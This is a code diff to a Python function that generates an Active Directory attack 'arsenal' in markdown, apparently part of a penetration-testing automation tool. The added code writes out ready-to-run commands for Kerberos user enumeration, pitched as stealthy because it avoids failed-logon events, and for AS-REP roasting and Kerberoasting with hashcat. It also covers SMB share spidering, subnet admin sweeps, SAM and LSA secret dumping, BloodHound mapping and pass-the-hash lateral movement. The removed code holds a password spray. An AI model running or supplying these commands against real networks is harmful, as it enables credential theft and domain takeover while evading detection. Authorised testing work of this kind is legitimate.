@@ -801,17 +801,6 @@ def generate_advisor_markdown(info: "TargetInfo", lhost: str = "<LHOST>") -> str
             for tool in win_tools:
                 lines += _tool_block(tool, info, lhost)
 
-        ad_tools = [t for t in AD_TOOLS if _check_condition(t["condition"], info)]
-        if ad_tools:
-            lines += [
-                "### 🏰 Active Directory Arsenal",
-                "",
-                "> Triggered: Kerberos / LDAP / domain indicators confirmed on this target.",
-                "",
-            ]
-            for tool in ad_tools:
-                lines += _tool_block(tool, info, lhost)
-
     # ── Linux tools ───────────────────────────────────────────────────────
     elif os_type == "Linux":
         lx_tools = [t for t in LINUX_PRIVESC if _check_condition(t["condition"], info)]
@@ -853,6 +842,165 @@ def generate_advisor_markdown(info: "TargetInfo", lhost: str = "<LHOST>") -> str
             "> to confirm, then re-evaluate which tools apply.",
             "",
         ]
+
+    # ── Active Directory Arsenal — unified phased methodology ─────────────
+    #
+    # Triggered by ANY AD indicator: confirmed DC flag, Kerberos+LDAP ports,
+    # or a resolved domain name.  OS-agnostic so it renders for Linux DCs too.
+    #
+    # Structure:
+    #   Phase 1 — Pre-Authentication (no creds required)
+    #   Phase 2 — Post-Authentication (valid credentials in hand)
+    #   Post-Shell tools — Windows on-target binaries (Windows targets only)
+    # ─────────────────────────────────────────────────────────────────────
+    if _is_ad(info):
+        ip         = info.ip
+        domain     = info.domain or "<DOMAIN>"
+        users_file = f"output/targets/{ip}/users.txt"
+
+        # Build base DN string for ldapsearch commands
+        _base_dn = (
+            ",".join(f"DC={part}" for part in domain.split("."))
+            if "." in domain and domain != "<DOMAIN>"
+            else "DC=<DOMAIN>,DC=<TLD>"
+        )
+
+        lines += [
+            "### 🏰 Active Directory Arsenal",
+            "",
+            f"> **Triggered:** Kerberos / LDAP / domain indicators confirmed on `{ip}`",
+            f"> (domain: `{domain}`).  ",
+            "> Work Phase 1 to exhaustion before moving to Phase 2.",
+            "> Never spray passwords without checking the lockout policy first.",
+            "",
+        ]
+
+        # ── PRIORITY ALERT: hashes already on disk — crack now ───────────
+        hash_file = getattr(info, "asreproast_hash_file", None)
+        if hash_file:
+            lines += [
+                "> ---",
+                "> ### 🔴 IMMEDIATE ACTION REQUIRED — AS-REP HASHES CAPTURED",
+                ">",
+                f"> Hash file: `{hash_file}`",
+                ">",
+                "> The framework already ran AS-REP Roasting and captured crackable",
+                "> hashes. Run the command below **right now** — no additional setup needed.",
+                "",
+                "```bash",
+                f"# [KALI LINUX] — Crack AS-REP hashes captured from {domain}",
+                f"hashcat -m 18200 {hash_file} \\",
+                f"    /usr/share/wordlists/rockyou.txt \\",
+                f"    -r /usr/share/john/rules/best64.rule",
+                "```",
+                "",
+                "---",
+                "",
+            ]
+
+        lines += [
+            "---",
+            "",
+            "#### ⚡ Phase 1 — Pre-Authentication (Discovery)",
+            "",
+            "> **[!] TACTIC:** Use Kerbrute when you have a massive list of potential",
+            "> users and need to validate them against the DC **quickly and stealthily",
+            "> without causing account lockouts**. Kerbrute only sends Kerberos AS-REQ",
+            "> messages — it never submits a password, so it does not trigger event ID",
+            "> 4625 (failed logon) or 4771 (pre-auth failure). Confirmed usernames feed",
+            "> directly into AS-REP Roasting for offline hash cracking.",
+            "",
+            "```bash",
+            f"# 1a — Enumerate valid domain usernames via Kerberos (zero lockout risk)",
+            f"kerbrute userenum \\",
+            f"    -d {domain} --dc {ip} \\",
+            f"    /usr/share/seclists/Usernames/Names/names.txt \\",
+            f"    -o output/targets/{ip}/ldap/kerbrute_users.txt",
+            "",
+            f"# 1b — AS-REP Roast: capture crackable hashes for accounts with",
+            f"#       pre-authentication disabled (no credentials needed)",
+            f"impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass \\",
+            f"    -usersfile {users_file} \\",
+            f"    -outputfile output/targets/{ip}/ldap/asrep_hashes.txt",
+            "",
+            f"# 1c — Crack the AS-REP hashes offline",
+            f"hashcat -m 18200 output/targets/{ip}/ldap/asrep_hashes.txt \\",
+            f"    /usr/share/wordlists/rockyou.txt",
+            "",
+            f"# 1d — Anonymous LDAP enumeration (no credentials needed)",
+            f"nxc ldap {ip} -u '' -p '' --users",
+            f"ldapsearch -x -H ldap://{ip} -b '{_base_dn}' \\",
+            f"    '(objectClass=user)' sAMAccountName description",
+            "```",
+            "",
+            "---",
+            "",
+            "#### 🔑 Phase 2 — Post-Authentication (Mapping & Lateral Movement)",
+            "",
+            "> **[!] TACTIC:** Use NetExec (nxc) **ONLY after obtaining valid credentials**.",
+            "> Use it to map network permissions, find local administrator access",
+            "> (look for the `Pwn3d!` label in output), spider SMB shares for",
+            "> sensitive files, and dump secrets. Each step below builds on the",
+            "> previous one — start with share mapping, then escalate.",
+            "",
+            "```bash",
+            f"# 2a — Map all SMB share permissions with valid credentials",
+            f"nxc smb {ip} -u '<USER>' -p '<PASS>' --shares",
+            "",
+            f"# 2b — Spider a readable share for sensitive files (passwords, configs)",
+            f"nxc smb {ip} -u '<USER>' -p '<PASS>' -M spider_plus --share '<SHARE>'",
+            "",
+            f"# 2c — Sweep the full subnet for local admin access",
+            f"#       Hosts showing 'Pwn3d!' grant full command execution",
+            f"nxc smb <SUBNET>/24 -u '<USER>' -p '<PASS>' --local-auth",
+            f"nxc smb <SUBNET>/24 -u '<USER>' -p '<PASS>'",
+            "",
+            f"# 2d — Dump SAM hashes (requires local admin on target)",
+            f"nxc smb {ip} -u '<USER>' -p '<PASS>' --sam",
+            "",
+            f"# 2e — Dump LSA secrets (domain-cached credentials, service creds)",
+            f"nxc smb {ip} -u '<USER>' -p '<PASS>' --lsa",
+            "",
+            f"# 2f — Kerberoast (domain creds required — captures service account hashes)",
+            f"impacket-GetUserSPNs {domain}/'<USER>:<PASS>' -dc-ip {ip} -request",
+            f"nxc ldap {ip} -u '<USER>' -p '<PASS>' \\",
+            f"    --kerberoasting output/targets/{ip}/ldap/kerberoast.txt",
+            f"hashcat -m 13100 output/targets/{ip}/ldap/kerberoast.txt \\",
+            f"    /usr/share/wordlists/rockyou.txt",
+            "",
+            f"# 2g — BloodHound collection: map the complete AD privilege graph",
+            f"nxc ldap {ip} -u '<USER>' -p '<PASS>' --bloodhound --collection All",
+            f"bloodhound-python -u '<USER>' -p '<PASS>' \\",
+            f"    -d {domain} -dc {ip} -c All",
+            "```",
+            "",
+        ]
+
+        # DC-specific additions — only when this host is confirmed as a DC
+        if info.is_domain_controller:
+            lines += [
+                "**DC-specific — Pass-the-Hash lateral movement:**",
+                "",
+                "```bash",
+                f"# When you have an NTLM hash instead of a cleartext password",
+                f"nxc smb {ip} -u '<USER>' -H '<NTLM_HASH>' --shares",
+                f"nxc smb <SUBNET>/24 -u '<USER>' -H '<NTLM_HASH>' --local-auth",
+                f"impacket-secretsdump {domain}/'<USER>'@{ip} -hashes ':<NTLM_HASH>'",
+                f"impacket-wmiexec {domain}/'<USER>'@{ip} -hashes ':<NTLM_HASH>'",
+                "```",
+                "",
+            ]
+
+        # On-target post-shell tools — Windows binaries only
+        if os_type == "Windows":
+            ad_tools = [t for t in AD_TOOLS if _check_condition(t["condition"], info)]
+            if ad_tools:
+                lines += [
+                    "**Post-shell binaries** *(transfer to target after gaining a shell)*:",
+                    "",
+                ]
+                for tool in ad_tools:
+                    lines += _tool_block(tool, info, lhost)
 
     # ── Gap 1: Credential Chain Attack Surface ────────────────────────────
     # Triggered whenever usernames were discovered AND at least one service
@@ -962,80 +1110,6 @@ def generate_advisor_markdown(info: "TargetInfo", lhost: str = "<LHOST>") -> str
             "```",
             "",
         ]
-
-    # ── Gap 4: Active Directory DC Attack Surface ─────────────────────────
-    # Triggered when this host is confirmed (or inferred) to be a DC.
-    if info.is_domain_controller:
-        ip     = info.ip
-        domain = info.domain or "<DOMAIN>"
-        users_file = f"output/targets/{ip}/users.txt"
-        lines += [
-            "### 🏰 Active Directory Attack Surface",
-            "",
-            f"> **Domain Controller confirmed** — `{ip}` (domain: `{domain}`)  ",
-            "> Run these enumeration steps in order.  ",
-            "> Replace `<DOMAIN>` if the domain name was not auto-detected.",
-            "",
-        ]
-
-        lines += [
-            "**AS-REP Roasting** *(no pre-auth required — no credentials needed)*:",
-            "",
-            "```bash",
-            f"# With user list (discovered users)",
-            f"impacket-GetNPUsers {domain}/ -usersfile {users_file} "
-            f"-format hashcat -dc-ip {ip} -no-pass",
-            f"# Blind (enumerate via LDAP anonymous bind first)",
-            f"impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass -request",
-            "```",
-            "",
-        ]
-
-        lines += [
-            "**Kerberoasting** *(requires valid credentials)*:",
-            "",
-            "```bash",
-            f"impacket-GetUserSPNs {domain}/'<USER>:<PASS>' -dc-ip {ip} -request",
-            f"nxc ldap {ip} -u '<USER>' -p '<PASS>' --kerberoasting kerberoast.txt",
-            "```",
-            "",
-        ]
-
-        lines += [
-            "**Anonymous LDAP Enumeration** *(no credentials needed)*:",
-            "",
-            "```bash",
-            f"windapsearch.py -d {domain} --dc-ip {ip} -U",
-            f"ldapsearch -x -H ldap://{ip} -b 'DC={',DC='.join(domain.split('.')) if '.' in domain else domain}' '(objectClass=user)' sAMAccountName",
-            f"nxc ldap {ip} -u '' -p '' --users",
-            "```",
-            "",
-        ]
-
-        lines += [
-            "**BloodHound Collection** *(authenticated — map the full attack path)*:",
-            "",
-            "```bash",
-            f"# With password",
-            f"nxc ldap {ip} -u '<USER>' -p '<PASS>' --bloodhound --collection All",
-            f"# With hash (PtH)",
-            f"nxc ldap {ip} -u '<USER>' -H '<NTLM_HASH>' --bloodhound --collection All",
-            f"# Alternatively with bloodhound-python",
-            f"bloodhound-python -u '<USER>' -p '<PASS>' -d {domain} -dc {ip} -c All",
-            "```",
-            "",
-        ]
-
-        if info.users_found:
-            lines += [
-                "**Password Spray** *(check lockout policy first — AS-REP roast gives you hashes to crack first)*:",
-                "",
-                "```bash",
-                f"kerbrute passwordspray --dc {ip} -d {domain} {users_file} 'Password123'",
-                f"nxc smb {ip} -u {users_file} -p 'Password123' --continue-on-success",
-                "```",
-                "",
-            ]
 
     # ── Pivot Rule 2: Operational pivoting section ───────────────────────
     lines += _pivot_section(info, lhost)
